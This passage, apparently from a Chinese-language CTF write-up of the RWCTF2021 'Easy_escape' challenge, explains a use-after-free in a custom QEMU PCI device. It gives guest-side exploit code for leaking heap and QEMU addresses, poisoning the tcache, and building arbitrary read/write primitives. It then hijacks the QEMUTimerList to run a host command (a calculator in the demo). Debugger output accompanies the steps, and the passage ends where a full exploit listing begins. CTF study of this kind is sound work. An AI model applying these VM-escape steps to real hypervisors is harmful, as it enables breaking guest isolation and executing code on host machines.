#14 <font color="#3465A4">0x0000555555a25c1d</font> in <font color="#C4A000">handle_data_write</font> (fun=0x5555576a0390, req=0x7fffa90dcc00, val=0) at <font color="#4E9A06">../hw/misc/fun.c</font>:87
#15 <font color="#3465A4">0x0000555555a25d98</font> in <font color="#C4A000">fun_mmio_read</font> (opaque=0x5555576a0390, addr=16, size=4) at <font color="#4E9A06">../hw/misc/fun.c</font>:123
#16 <font color="#3465A4">0x0000555555c07e3c</font> in <font color="#C4A000">memory_region_read_accessor</font> (mr=0x5555576a0c80, addr=16, value=0x7ffff504be88, size=4, shift=0, mask=4294967295, attrs=...) at <font color="#4E9A06">../softmmu/memory.c</font>:442
#17 <font color="#3465A4">0x0000555555c0833c</font> in <font color="#C4A000">access_with_adjusted_size</font> (addr=16, value=0x7ffff504be88, size=4, access_size_min=4, access_size_max=4, access_fn=0x555555c07df6 &lt;memory_region_read_accessor&gt;, mr=0x5555576a0c80, attrs=...) at <font color="#4E9A06">../softmmu/memory.c</font>:552
#18 <font color="#3465A4">0x0000555555c0b02c</font> in <font color="#C4A000">memory_region_dispatch_read1</font> (mr=0x5555576a0c80, addr=16, pval=0x7ffff504be88, size=4, attrs=...) at <font color="#4E9A06">../softmmu/memory.c</font>:1420
#19 <font color="#3465A4">0x0000555555c0b11a</font> in <font color="#C4A000">memory_region_dispatch_read</font> (mr=0x5555576a0c80, addr=16, pval=0x7ffff504be88, op=MO_32, attrs=...) at <font color="#4E9A06">../softmmu/memory.c</font>:1449
#20 <font color="#3465A4">0x0000555555bc8957</font> in <font color="#C4A000">io_readx</font> (env=0x5555569448d0, iotlbentry=0x7fffa8e101f0, mmu_idx=1, addr=140006722416656, retaddr=140736229919352, access_type=MMU_DATA_LOAD, op=MO_32) at <font color="#4E9A06">../accel/tcg/cputlb.c</font>:1317
#21 <font color="#3465A4">0x0000555555bc9df1</font> in <font color="#C4A000">load_helper</font> (env=0x5555569448d0, addr=140006722416656, oi=33, retaddr=140736229919352, op=MO_32, code_read=false, full_load=0x555555bca160 &lt;full_le_ldul_mmu&gt;) at <font color="#4E9A06">../accel/tcg/cputlb.c</font>:1872
#22 <font color="#3465A4">0x0000555555bca1aa</font> in <font color="#C4A000">full_le_ldul_mmu</font> (env=0x5555569448d0, addr=140006722416656, oi=33, retaddr=140736229919352) at <font color="#4E9A06">../accel/tcg/cputlb.c</font>:1968
#23 <font color="#3465A4">0x0000555555bca1e2</font> in <font color="#C4A000">helper_le_ldul_mmu</font> (env=0x5555569448d0, addr=140006722416656, oi=33, retaddr=140736229919352) at <font color="#4E9A06">../accel/tcg/cputlb.c</font>:1975
#24 <font color="#3465A4">0x00007fffb4fdcb63</font> in <font color="#C4A000">code_gen_buffer</font> ()
#25 <font color="#3465A4">0x0000555555b95552</font> in <font color="#C4A000">cpu_tb_exec</font> (cpu=0x55555693c070, itb=0x7fffb4fdc900 &lt;code_gen_buffer+45725907&gt;) at <font color="#4E9A06">../accel/tcg/cpu-exec.c</font>:178
#26 <font color="#3465A4">0x0000555555b96403</font> in <font color="#C4A000">cpu_loop_exec_tb</font> (cpu=0x55555693c070, tb=0x7fffb4fdc900 &lt;code_gen_buffer+45725907&gt;, last_tb=0x7ffff504c5b8, tb_exit=0x7ffff504c5b0) at <font color="#4E9A06">../accel/tcg/cpu-exec.c</font>:658
#27 <font color="#3465A4">0x0000555555b966fb</font> in <font color="#C4A000">cpu_exec</font> (cpu=0x55555693c070) at <font color="#4E9A06">../accel/tcg/cpu-exec.c</font>:771
#28 <font color="#3465A4">0x0000555555bab751</font> in <font color="#C4A000">tcg_cpu_exec</font> (cpu=0x55555693c070) at <font color="#4E9A06">../accel/tcg/tcg-cpus.c</font>:243
#29 <font color="#3465A4">0x0000555555babcc2</font> in <font color="#C4A000">tcg_cpu_thread_fn</font> (arg=0x55555693c070) at <font color="#4E9A06">../accel/tcg/tcg-cpus.c</font>:427
#30 <font color="#3465A4">0x0000555555e77a29</font> in <font color="#C4A000">qemu_thread_start</font> (args=0x55555696b890) at <font color="#4E9A06">../util/qemu-thread-posix.c</font>:521
#31 <font color="#3465A4">0x00007ffff781b609</font> in <font color="#C4A000">start_thread</font> (arg=&lt;optimized out&gt;) at <font color="#4E9A06">pthread_create.c</font>:477
#32 <font color="#3465A4">0x00007ffff773e353</font> in <font color="#C4A000">clone</font> () at <font color="#4E9A06">../sysdeps/unix/sysv/linux/x86_64/clone.S</font>:95</pre>

<p>因此存在 UAF 漏洞。</p>
<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2>
  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>这里其实 2 个 chunk 也能完成利用，但是 1 个chunk 不行，因为 <code>handle_data_*</code> 函数要求 <code>req-&gt;total_size</code> 不为 0。</p>

    </div>
  </div>

<p>我们创建 <code>req</code> 并在 <code>req.list</code> 中申请三个 chunk。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/30/qemu%20%E9%80%83%E9%80%B8/images/6c9d6723ad1d798cb83bd8c805a8880f.png"
                     
                ></p>
<p>在 <code>fun_mmio_read-&gt;handle_data_write-&gt;dma_memory_write</code> 时发生 UAF，此时读取的 <code>req.list[0]</code> 中的数据实际上是 <code>tcache_pthread_struct</code> 中的数据，因此可以泄露 <code>req</code> 的地址，另外 <code>tcache_pthread_struct</code> 之后有一个指向存放 qemu 地址的内存的指针也可以泄露。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/30/qemu%20%E9%80%83%E9%80%B8/images/ea9938b05a2581db6bb0f249aa1c8959.png"
                     
                ></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mmio_init(<span class="string">&quot;0000:00:04.0&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="type">uint8_t</span>* buf = mmap(<span class="literal">NULL</span>, getpagesize(),</span><br><span class="line">                    PROT_READ | PROT_WRITE,</span><br><span class="line">                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, <span class="comment">// 关键</span></span><br><span class="line">                    <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="type">size_t</span> buf_paddr = virt_to_phys(buf);</span><br><span class="line"></span><br><span class="line">mmio_write32(SIZE, (<span class="number">3</span> - <span class="number">1</span>) &lt;&lt; <span class="number">10</span>);</span><br><span class="line">mmio_write32(ADDR, buf_paddr);</span><br><span class="line">mmio_write32(INDEX, <span class="number">0</span>);</span><br><span class="line">mmio_write32(RESULT_ADDR, mmio_phys_base() + DELETE_REQ);</span><br><span class="line">mmio_write32(CREATE_REQ, <span class="number">0x114514</span>);</span><br><span class="line">mmio_read32(HANDLE_DATA);</span><br><span class="line"></span><br><span class="line">qword_dump(<span class="string">&quot;leak req addr from tcache_perthread_struct (req-&gt;list[0])&quot;</span>, buf, <span class="number">0x400</span>);</span><br><span class="line"><span class="type">size_t</span> req_addr = *(<span class="type">size_t</span>*)(buf + <span class="number">0x278</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] req addr: %#llx\n&quot;</span>, req_addr);</span><br><span class="line"><span class="type">size_t</span> qemu_leak_addr = *(<span class="type">size_t</span>*)(buf + <span class="number">0x358</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] qemu_leak addr: %#llx\n&quot;</span>, qemu_leak_addr);</span><br></pre></td></tr></table></figure></div>

<p>调试的时候需要切换到线程 3 观察 tcache 的状态：</p>
<pre><font color="#4E9A06"><b>pwndbg&gt; </b></font>threads
  global_num  name             status    pc              symbol
------------  ---------------  --------  --------------  ----------------------------------
           <font color="#4E9A06"><b>1</b></font>  <font color="#4E9A06"><b>qemu-system-x86</b></font>  <font color="#C4A000">stopped</font>   <font color="#CC0000">0x7ffff7731cb6</font>  <font color="#4E9A06"><b>ppoll+166</b></font>
           2  qemu-system-x86  <font color="#C4A000">stopped</font>   <font color="#CC0000">0x7ffff773795d</font>  syscall+29
           3  qemu-system-x86  <font color="#C4A000">stopped</font>   <font color="#CC0000">0x7ffff7822376</font>  pthread_cond_wait@@GLIBC_2.3.2+534
Showing 3 of 3 threads.
<font color="#4E9A06"><b>pwndbg&gt; </b></font>thread 3
[Switching to thread 3 (Thread 0x7ffff504d700 (LWP 10251))]
#0  <font color="#C4A000">futex_wait_cancelable</font> (<font color="#06989A">private</font>=&lt;optimized out&gt;, <font color="#06989A">expected</font>=0, <font color="#06989A">futex_word</font>=0x55555696b878) at <font color="#4E9A06">../sysdeps/nptl/futex-internal.h</font>:183
183	../sysdeps/nptl/futex-internal.h: No such file or directory.
<font color="#4E9A06"><b>pwndbg&gt; </b></font>tcachebins 
<font color="#3465A4">tcachebins</font>
...
<font color="#C4A000">0x410 [  4]</font>: <font color="#75507B">0x7fffa9165c00</font> —▸ <font color="#75507B">0x7fffa9285a00</font> —▸ <font color="#75507B">0x7fffa8e0fd50</font> —▸ <font color="#75507B">0x7fffa90dc400</font> ◂— 0
</pre>

<p><code>req</code> 结构体的状态如下：</p>
<pre><font color="#4E9A06"><b>pwndbg&gt; </b></font>p *(FunReq*)0x7fffa9165c00
&dollar;1 = {
  total_size = 2837993984,
  list = {<font color="#3465A4">0x7fffa80008d0</font> &quot;\a&quot;, <font color="#3465A4">0x7fffa8e0fd50</font> &quot;&quot;, <font color="#3465A4">0x7fffa9285a00</font> &quot;P\375\340\250\377\177&quot;, <font color="#3465A4">0x0</font> &lt;repeats 124 times&gt;}
}
</pre>


<p>然后在 tcache 偏移 0x278 和 0x358 偏移分别泄露：</p>
<pre><font color="#4E9A06"><b>pwndbg&gt; </b></font>tcache
<font color="#75507B">tcache is pointing to: </font><font color="#C4A000">0x7fffa80008d0</font><font color="#75507B"> for thread </font><font color="#C4A000">3</font>
{
  counts = {7 &lt;repeats 32 times&gt;, 0, 7, 7, 0, 1, 0, 1, 1, 0, 2, 2, 0, 2, 1, 2, 0, 0, 3, 0, 1, 1, 0, 1, 2, 0, 0, 0, 1, 2, 2, 2, 4},
  entries = {0x7fffa835a1a0, 0x7fffa82ac110, 0x7fffa8ffdb90, 0x7fffa80aaa30, 0x7fffa833ba00, 0x7fffa836b390, 0x7fffa8371a00, 0x7fffa8343a20, 0x7fffa8366960, 0x7fffa834f200, 0x7fffa8346740, 0x7fffa8341a30, 0x7fffa8350a00, 0x7fffa8251800, 0x7fffa83}
}
<font color="#4E9A06"><b>pwndbg&gt; </b></font>telescope 0x7fffa80008d0+0x278
00:0000│  <font color="#75507B">0x7fffa8000b48</font> —▸ <font color="#75507B">0x7fffa9165c00</font> —▸ <font color="#75507B">0x7fffa9285a00</font> —▸ <font color="#75507B">0x7fffa8e0fd50</font> —▸ <font color="#75507B">0x7fffa90dc400</font> ◂— ...
01:0008│  <font color="#75507B">0x7fffa8000b50</font> ◂— 0
02:0010│  <font color="#75507B">0x7fffa8000b58</font> ◂— 0x98c5
03:0018│  <font color="#75507B">0x7fffa8000b60</font> —▸ <font color="#75507B">0x7fffa800b7e0</font> ◂— 0xffff0000f038
04:0020│  <font color="#75507B">0x7fffa8000b68</font> —▸ <font color="#75507B">0x7fffa8012430</font> ◂— 0
05:0028│  <font color="#75507B">0x7fffa8000b70</font> —▸ <font color="#75507B">0x7fffa800a420</font> —▸ <font color="#75507B">0x7fffa80a1950</font> —▸ <font color="#75507B">0x7fffa804cc00</font> —▸ <font color="#75507B">0x7fffa80590a0</font> ◂— ...
06:0030│  <font color="#75507B">0x7fffa8000b78</font> —▸ <font color="#75507B">0x7fffa800a420</font> —▸ <font color="#75507B">0x7fffa80a1950</font> —▸ <font color="#75507B">0x7fffa804cc00</font> —▸ <font color="#75507B">0x7fffa80590a0</font> ◂— ...
07:0038│  <font color="#75507B">0x7fffa8000b80</font> ◂— 0
<font color="#4E9A06"><b>pwndbg&gt; </b></font>telescope 0x7fffa80008d0+0x358
00:0000│  <font color="#75507B">0x7fffa8000c28</font> —▸ <font color="#CC0000"><u style="text-decoration-style:single">0x7fffb4fede58 (code_gen_buffer+45796907)</u></font> —▸ <font color="#CC0000">0x555555cc1795 (helper_lookup_tb_ptr)</font> ◂— <font color="#AFD700">endbr64</font><font color="#EEEEEC"> </font>
01:0008│  <font color="#75507B">0x7fffa8000c30</font> —▸ <font color="#CC0000"><u style="text-decoration-style:single">0x7fffefffdc00 (code_gen_buffer+1035717587)</u></font> ◂— 0
02:0010│  <font color="#75507B">0x7fffa8000c38</font> ◂— 0x4d0e
03:0018│  <font color="#75507B">0x7fffa8000c40</font> ◂— 0
04:0020│  <font color="#75507B">0x7fffa8000c48</font> —▸ <font color="#75507B">0x7fffa800b6e8</font> ◂— 0x3290a8aa01
05:0028│  <font color="#75507B">0x7fffa8000c50</font> —▸ <font color="#75507B">0x7fffa800b760</font> ◂— 0
06:0030│  <font color="#75507B">0x7fffa8000c58</font> —▸ <font color="#75507B">0x7fffa800b768</font> —▸ <font color="#75507B">0x7fffa800b7b8</font> —▸ <font color="#75507B">0x7fffa800b790</font> ◂— 0
07:0038│  <font color="#75507B">0x7fffa8000c60</font> —▸ <font color="#75507B">0x7fffa800a430</font> ◂— 0x10003
<font color="#4E9A06"><b>pwndbg&gt; </b></font>vmmap 0x555555cc1795
LEGEND: <font color="#C4A000">STACK</font> | <font color="#3465A4">HEAP</font> | <font color="#CC0000">CODE</font> | <font color="#75507B">DATA</font> | <font color="#CC0000"><u style="text-decoration-style:single">WX</u></font> | RODATA
             Start                End Perm     Size Offset File
    0x555555554000     0x555555808000 r--p   2b4000      0 /home/ubuntu/Desktop/RWCTF2021_Easy_escape/RWCTF-Easy_escape/qemu-system-x86_64
<font color="#CC0000">►   0x555555808000     0x555555ec9000 r-xp   6c1000 2b4000 /home/ubuntu/Desktop/RWCTF2021_Easy_escape/RWCTF-Easy_escape/qemu-system-x86_64 +0x4b9795</font>
    0x555555ec9000     0x555556403000 r--p   53a000 975000 /home/ubuntu/Desktop/RWCTF2021_Easy_escape/RWCTF-Easy_escape/qemu-system-x86_64
</pre>

<hr>
<p>再次创建 <code>req</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/30/qemu%20%E9%80%83%E9%80%B8/images/97f01151ca1c929ed908f56a9ca8d501.png"
                     
                ></p>
<p>之后 <code>fun_mmio_write-&gt;handle_data_read-&gt;dma_memory_read</code> 时 UAF 修改 <code>req.list[1]</code> 的 <code>fd</code> 指向 <code>req</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/30/qemu%20%E9%80%83%E9%80%B8/images/77bdfec0df9461f918d9048edcdb51ea.png"
                     
                ></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*(size_t*)(buf + (<span class="number">1</span> &lt;&lt; <span class="number">10</span>)) = req_addr;</span><br><span class="line">mmio_write32(SIZE, (<span class="number">3</span> - <span class="number">1</span>) &lt;&lt; <span class="number">10</span>);</span><br><span class="line">mmio_write32(ADDR, buf_paddr);</span><br><span class="line">mmio_write32(INDEX, <span class="number">1</span>);</span><br><span class="line">mmio_write32(RESULT_ADDR, mmio_phys_base() + DELETE_REQ);</span><br><span class="line">mmio_write32(CREATE_REQ, <span class="number">0x114514</span>);</span><br><span class="line">mmio_write32(HANDLE_DATA, <span class="number">0x1919810</span>);</span><br></pre></td></tr></table></figure></div>


<pre><font color="#C4A000">0x410 [  4]</font>: <font color="#75507B">0x7fffa91eec00</font> —▸ <font color="#75507B">0x7fffa9165c00</font> —▸ <font color="#75507B">0x7fffa90dc400</font> ◂— <font color="#75507B">0x7fffa91eec00</font>
</pre>

<p>再次创建 <code>req</code> 时 <code>req.list[2]</code> 指向 <code>req</code> 。此时实现了 <code>req</code> 的自写，其中 <code>lreq.ist[0]</code> 为 NULL 时因为 tcache 在取出 chunk 时会将 key 字段置 0 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/30/qemu%20%E9%80%83%E9%80%B8/images/d3b14311b494dc240765abee8fe5409b.png"
                     
                ></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mmio_write32(RESULT_ADDR, buf_paddr + <span class="number">0x400</span>);</span><br><span class="line">mmio_write32(SIZE, (<span class="number">3</span> - <span class="number">1</span>) &lt;&lt; <span class="number">10</span>);</span><br><span class="line">mmio_write32(CREATE_REQ, <span class="number">0x114514</span>);</span><br><span class="line">mmio_write32(INDEX, <span class="number">2</span>);</span><br></pre></td></tr></table></figure></div>

<pre><font color="#4E9A06"><b>pwndbg&gt; </b></font>p *(FunReq*)0x7fffa91eec00
&dollar;2 = {
  total_size = 2048,
  list = {<font color="#3465A4">0x0</font>, <font color="#3465A4">0x7fffa90dc400</font> &quot;&quot;, <font color="#3465A4">0x7fffa91eec00</font> &quot;&quot;, <font color="#3465A4">0x0</font> &lt;repeats 124 times&gt;}
}
</pre>

<p>我们可以通过 <code>req</code> 自写将 <code>list[0]</code> 指向目标地址从而实现任意地址读写。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_address_read</span><span class="params">(<span class="type">size_t</span> address)</span></span><br><span class="line">&#123;</span><br><span class="line">    mmio_write32(SIZE, (<span class="number">3</span> - <span class="number">1</span>) &lt;&lt; <span class="number">10</span>);</span><br><span class="line">    mmio_write32(INDEX, <span class="number">2</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)(buf + (<span class="number">2</span> &lt;&lt; <span class="number">10</span>)) = (<span class="number">3</span> - <span class="number">1</span>) &lt;&lt; <span class="number">10</span>;</span><br><span class="line">    *(<span class="type">size_t</span>*)(buf + (<span class="number">2</span> &lt;&lt; <span class="number">10</span>) + <span class="number">8</span>) = address;</span><br><span class="line">    *(<span class="type">size_t</span>*)(buf + (<span class="number">2</span> &lt;&lt; <span class="number">10</span>) + <span class="number">0x10</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">size_t</span>*)(buf + (<span class="number">2</span> &lt;&lt; <span class="number">10</span>) + <span class="number">0x18</span>) = req_addr;</span><br><span class="line">    mmio_write32(HANDLE_DATA, <span class="number">0x114514</span>);</span><br><span class="line">    mmio_write32(INDEX, <span class="number">0</span>);</span><br><span class="line">    mmio_read32(HANDLE_DATA);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_address_write</span><span class="params">(<span class="type">size_t</span> address)</span></span><br><span class="line">&#123;</span><br><span class="line">    mmio_write32(SIZE, (<span class="number">3</span> - <span class="number">1</span>) &lt;&lt; <span class="number">10</span>);</span><br><span class="line">    mmio_write32(INDEX, <span class="number">2</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)(buf + (<span class="number">2</span> &lt;&lt; <span class="number">10</span>)) = (<span class="number">3</span> - <span class="number">1</span>) &lt;&lt; <span class="number">10</span>;</span><br><span class="line">    *(<span class="type">size_t</span>*)(buf + (<span class="number">2</span> &lt;&lt; <span class="number">10</span>) + <span class="number">8</span>) = address;</span><br><span class="line">    *(<span class="type">size_t</span>*)(buf + (<span class="number">2</span> &lt;&lt; <span class="number">10</span>) + <span class="number">0x10</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">size_t</span>*)(buf + (<span class="number">2</span> &lt;&lt; <span class="number">10</span>) + <span class="number">0x18</span>) = req_addr;</span><br><span class="line">    mmio_write32(HANDLE_DATA, <span class="number">0x114514</span>);</span><br><span class="line">    mmio_write32(INDEX, <span class="number">0</span>);</span><br><span class="line">    mmio_write32(HANDLE_DATA, <span class="number">0x1919810</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后就是常规的泄露 qemu 基址，改 <code>main_loop_tlg</code> 指向的 <code>QEMUTimerList</code> 实现逃逸。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">arbitrary_address_read(qemu_leak_addr);</span><br><span class="line"><span class="type">size_t</span> qemu_base = *(<span class="type">size_t</span>*)buf - <span class="number">0x6761b0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] qemu base: %#llx\n&quot;</span>, qemu_base);</span><br><span class="line"><span class="type">size_t</span> system_plt = qemu_base + <span class="number">0x2b8a70</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] system@plt addr: %#llx\n&quot;</span>, system_plt);</span><br><span class="line"><span class="type">size_t</span> main_loop_tlg_addr = qemu_base + <span class="number">0x112cd40</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] main_loop_tlg addr: %#llx\n&quot;</span>, main_loop_tlg_addr);</span><br><span class="line"></span><br><span class="line">arbitrary_address_read(main_loop_tlg_addr);</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> QEMUTimerList_addr = *(<span class="type">size_t</span>*)(buf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] QEMUTimer addr: %#llx\n&quot;</span>, QEMUTimerList_addr);</span><br><span class="line"></span><br><span class="line">arbitrary_address_read(QEMUTimerList_addr);</span><br><span class="line">*(<span class="type">size_t</span>*)(buf + <span class="number">0x58</span>) = system_plt;</span><br><span class="line">*(<span class="type">size_t</span>*)(buf + <span class="number">0x60</span>) = QEMUTimerList_addr + <span class="number">0x200</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(buf + <span class="number">0x200</span>, <span class="string">&quot;/usr/bin/gnome-calculator&quot;</span>);</span><br><span class="line">arbitrary_address_write(QEMUTimerList_addr);</span><br></pre></td></tr></table></figure></div>

<h2 id="完整-Exp-1"><a href="#完整-Exp-1" class="headerlink" title="完整 Exp"></a>完整 Exp</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span 